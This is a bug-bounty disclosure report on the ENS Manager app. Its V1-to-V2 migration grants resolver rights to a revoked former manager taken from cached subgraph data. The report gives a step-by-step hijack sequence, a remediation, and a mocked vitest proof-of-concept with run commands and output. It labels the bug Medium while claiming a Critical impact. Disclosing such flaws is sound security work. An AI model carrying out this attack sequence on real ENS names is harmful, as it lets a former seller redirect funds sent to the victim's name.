# 89249 w a medium stale authorization in v1 to v2 manager migration resurrects a revoked manager and lets a former seller hijack the ens resolver

**Submitted on Aug 18th 2026 at 08:30:20 UTC by @ngosytuan for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89249
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:
    * a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker
    * redirecting the recipient of a name transfer
    * leaving a name permanently inaccessible after the flow

## Description

**Affected asset:** `apps/manager`\
**Audited revision:** `63772fd872af472ced58b009499355f3430c2a86` (competition mirror commit `cda79acaad59711b943fc68207ebb3f1d0ff8596`)\
**Bug class:** Stale authorization / TOCTOU

The Manager migration flow restores `ROLE_SET_RESOLVER` from the V1 subgraph's cached `domain.owner.id` without confirming that the address is still the live V1 Registry manager. After a V1 registration changes hands and the buyer reclaims the manager role, Manager can build a wallet-signed migration that grants V2 resolver authority back to the former seller. The former seller can then assign an attacker-controlled resolver, make the victim's ENS name resolve to the attacker's address, and receive assets sent to that name.

This matches the program's Critical impact: **hijacking an ENS name during V1-to-V2 Manager migration, including a migration that assigns its resolver to an attacker**.

### Root cause

1. `apps/manager/src/features/migration/service/v1SubgraphClient.ts:22-47` obtains `owner.id` from the V1 subgraph.
2. `apps/manager/src/features/migration/hooks/useV1Names.ts:12-23` treats that response as fresh for five minutes.
3. `apps/manager/src/features/migration/service/buildMigrationPlan.ts:317-380` classifies those same cached domains and builds the atomic transaction. `packages/migration/src/service/classifyNames.ts:148-184` copies cached `domain.owner.id` into `managerAddress`.
4. The live eligibility checks only read `BaseRegistrar.ownerOf`/`NameWrapper.getData` and V2 reservation state. They never read the live V1 `ENSRegistry.owner(node)` (`packages/migration/src/service/preflightChecks.ts:47-101,191-225`).
5. `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:11-24` encodes the stale address directly:

```typescript
grantRoles(resource, 1n << 24n, name.managerAddress)
```

6. The post-state verifier expects the stale address to possess the role and therefore treats the privilege resurrection as success (`buildAtomicMigrationBatches.ts:608-624`; `verifyAtomicMigrationBatch.ts:337-353`). The confirmation UI only says “Restore the existing managers” and does not identify the address.

### Attack sequence

{% stepper %}
{% step %}

## Transfer or sell an unwrapped V1 registration

The attacker transfers or sells an unwrapped V1 `.eth` registration to the victim while the attacker remains its legacy Registry manager.
{% endstep %}

{% step %}

## Fetch a valid snapshot

Manager fetches a valid snapshot containing `registrant = victim` and `owner/manager = attacker`.
{% endstep %}

{% step %}

## Reclaim the live V1 Registry manager role

The victim reclaims the live V1 Registry manager role. At this point the attacker controls neither the registration NFT nor the live Registry node.
{% endstep %}

{% step %}

## Start migration before cached data expires

The victim uses the normal Manager migration flow before the five-minute client cache expires. Normal subgraph indexing delay creates the same state.
{% endstep %}

{% step %}

## Pass live eligibility checks

The live checks pass because `BaseRegistrar.ownerOf` is the victim and the V2 name is reserved. No live Registry-manager check occurs.
{% endstep %}

{% step %}

## Sign the migration

The victim signs the migration presented by Manager. Its atomic HCA transaction migrates the name and calls `grantRoles(resource, ROLE_SET_RESOLVER, attacker)`.
{% endstep %}

{% step %}

## Hijack the resolver

The attacker calls V2 `setResolver` and points the name to an attacker-controlled resolver/address record. Transfers resolving the victim's name are sent to the attacker.
{% endstep %}
{% endstepper %}

No leaked credential, malicious dependency, subgraph compromise, public-network testing, or smart-contract bug is required.the vulnerability is the in-scope Manager application's use of stale off-chain data as authorization input

### Recommended remediation

Before plan construction, batch-read live V1 `ENSRegistry.owner(node)` for every unwrapped name and derive `managerAddress` only from that value. Repeat the check immediately before execution, bind the reviewed manager address into the plan, and abort if it changes. Cached subgraph data must never authorize a role grantt.

## Proof of Concept

The following test uses the production classification, live eligibility, role-grant, and atomic HCA batch builders. It models:

* an honest cached snapshot where the buyer is registrant and the former seller is manager;
* live `BaseRegistrar.ownerOf = VICTIM`;
* live V2 status `RESERVED`;
* a live Registry `owner` handler that would return `VICTIM`, but is never called.

The test proves that eligibility passes, decodes the actual nested `executeByOwner` calldata, and confirms that Manager grants `ROLE_SET_RESOLVER` to `FORMER_MANAGER`. It also proves that post-state verification expects the attacker's role.

{% stepper %}
{% step %}

## Create the test file

Create this file:

`apps/manager/src/features/migration/service/staleManagerPrivilegeResurrection.poc.test.ts`
{% endstep %}

{% step %}

## Paste the complete PoC

```typescript
import {
  type Address,
  decodeFunctionData,
  encodeAbiParameters,
  type Hex,
  type PublicClient,
  parseAbi,
} from 'viem'
import { sepolia } from 'viem/chains'
import { assert, describe, expect, it, vi } from 'vitest'

import { ETH_REGISTRY_V2_ABI } from '../contracts/abis'
import { V1_CONTRACTS, V2_CONTRACTS } from '../contracts/addresses'
import { makeDomain } from './_fixtures'
import { buildAtomicMigrationBatches } from './buildAtomicMigrationBatches'
import { classifyName } from './classifyNames'
import type { DirectMigrationRoute } from './directMigrationRoutes'
import { runEligibilityChecks } from './preflightChecks'

const VICTIM: Address = '0x00000000000000000000000000000000000000b1'
const FORMER_MANAGER: Address = '0x00000000000000000000000000000000000000c1'
const HCA: Address = '0x00000000000000000000000000000000000000a1'
const ROLE_SET_RESOLVER = 1n << 24n

const hcaOwnerExecutionAbi = parseAbi([
  'function executeByOwner((address target, uint256 value, bytes callData)[] executions) payable',
])

type Aggregate3Call = {
  readonly target: Address
  readonly allowFailure: boolean
  readonly callData: Hex
}

type MockReadRequest = {
  readonly functionName: string
  readonly args?: readonly [readonly Aggregate3Call[]]
}

describe('PoC: stale V1 manager privilege resurrection', () => {
  it('grants ROLE_SET_RESOLVER to a former manager although live ownership is the victim', async () => {
    // Cached subgraph snapshot after a V1 registration transfer.
    // The buyer has since reclaimed the live registry manager role to VICTIM.
    const staleDomain = makeDomain({
      id: '0x8e74a6f012f2df1bfbf9f3c5d55ff764fc06d3e6d1f9ea25b15a9bf7c2a21337',
      labelhash:
        '0x8e74a6f012f2df1bfbf9f3c5d55ff764fc06d3e6d1f9ea25b15a9bf7c2a21337',
      labelName: 'victim',
      name: 'victim.eth',
      registrantId: VICTIM,
      ownerId: FORMER_MANAGER,
    })
    const classification = classifyName(staleDomain, VICTIM)
    assert(classification?.type === 'classified')
    expect(classification.name.managerAddress?.toLowerCase()).toBe(
      FORMER_MANAGER.toLowerCase(),
    )

    // All implemented live checks pass. A live Registry owner() read would
    // return VICTIM, but production never performs that authorization check.
    const readContract = vi.fn(async (request: MockReadRequest) => {
      if (request.functionName === 'owner') return VICTIM
      if (request.functionName !== 'aggregate3') {
        throw new Error(`unexpected readContract: ${request.functionName}`)
      }

      return (request.args?.[0] ?? []).map(({ target }) => {
        if (target.toLowerCase() === V1_CONTRACTS.BaseRegistrar.toLowerCase()) {
          return {
            success: true,
            returnData: encodeAbiParameters([{ type: 'address' }], [VICTIM]),
          }
        }
        if (target.toLowerCase() === V2_CONTRACTS.ETHRegistry.toLowerCase()) {
          return {
            success: true,
            returnData: encodeAbiParameters([{ type: 'uint8' }], [1]),
          }
        }
        throw new Error(`unexpected multicall target: ${target}`)
      })
    })
    const publicClient = {
      chain: sepolia,
      readContract,
    } as unknown as PublicClient

    const eligibility = await runEligibilityChecks(
      publicClient,
      [classification.name],
      VICTIM,
    )
    const checkedFunctions = readContract.mock.calls.map(
      ([request]) => request.functionName,
    )
    expect(checkedFunctions).toEqual(['aggregate3', 'aggregate3'])
    expect(checkedFunctions).not.toContain('owner')
    const checkedTargets = readContract.mock.calls.flatMap(
      ([request]) => request.args?.[0].map(({ target }) => target) ?? [],
    )
    expect(checkedTargets.map((target) => target.toLowerCase())).toEqual([
      V1_CONTRACTS.BaseRegistrar.toLowerCase(),
      V2_CONTRACTS.ETHRegistry.toLowerCase(),
    ])
    expect(eligibility.eligible).toEqual([classification.name])

    const directRoute: DirectMigrationRoute = {
      name: 'victim.eth',
      receiver: V2_CONTRACTS.UnlockedMigrationController,
      parentDependency: null,
      expectedWrapperRegistry: null,
      receiverReadiness: 'migration-controller',
    }
    const plan = await buildAtomicMigrationBatches({
      chainId: sepolia.id,
      hca: HCA,
      wallet: VICTIM,
      classified: eligibility.eligible,
      directRoutes: new Map([['victim.eth', directRoute]]),
      profiles: new Map(),
      defaultResolver: V2_CONTRACTS.DefaultResolver,
      resolverDeployed: true,
      walletCoAdminGranted: true,
      maxOuterGas: 1_000_000n,
      estimateOuterGas: async () => 100_000n,
    })
    const batch = plan.batches[0]
    assert(batch)

    // Decode the actual call nested in the wallet-signed HCA transaction.
    const outer = decodeFunctionData({
      abi: hcaOwnerExecutionAbi,
      data: batch.outerCall.data,
    })
    assert(outer.functionName === 'executeByOwner')
    const [executions] = outer.args
    const attackerGrant = executions.find(
      ({ target }) =>
        target.toLowerCase() === V2_CONTRACTS.ETHRegistry.toLowerCase(),
    )
    assert(attackerGrant)
    const grant = decodeFunctionData({
      abi: ETH_REGISTRY_V2_ABI,
      data: attackerGrant.callData,
    })
    expect(grant.functionName).toBe('grantRoles')
    const [, roles, account] = grant.args as [bigint, bigint, Address]
    expect(roles).toBe(ROLE_SET_RESOLVER)
    expect(account.toLowerCase()).toBe(FORMER_MANAGER.toLowerCase())

    // Post-state verification accepts the stale privilege as intended state.
    const managerExpectation = batch.verificationExpectations.find(
      (expectation) => expectation.type === 'manager-role',
    )
    assert(managerExpectation?.type === 'manager-role')
    expect(managerExpectation.account.toLowerCase()).toBe(
      FORMER_MANAGER.toLowerCase(),
    )
    expect(managerExpectation.roleBitmap).toBe(ROLE_SET_RESOLVER)
  })
})
```

{% endstep %}

{% step %}

## Install the frozen workspace dependencies if needed

```bash
npx --yes --package=node@22.18.0 --package=pnpm@10.27.0 -- \
  pnpm install --frozen-lockfile --ignore-scripts
```

{% endstep %}

{% step %}

## Run the PoC from the repository root

```bash
cd apps/manager
node_modules/.bin/vitest run \
  src/features/migration/service/staleManagerPrivilegeResurrection.poc.test.ts \
  --reporter=verbose
```

{% endstep %}

{% step %}

## Observed result

```
✓ ... grants ROLE_SET_RESOLVER to a former manager although live ownership is the victim
Test Files  1 passed (1)
Tests       1 passed (1)
Exit code   0
```

{% endstep %}
{% endstepper %}

The passing assertions prove that the live ownership gates accept the victim, Manager does not query the live V1 Registry manager, the wallet-signed HCA batch grants `ROLE_SET_RESOLVER` to the revoked former manager, and the post-state verifier explicitly accepts that attacker role.
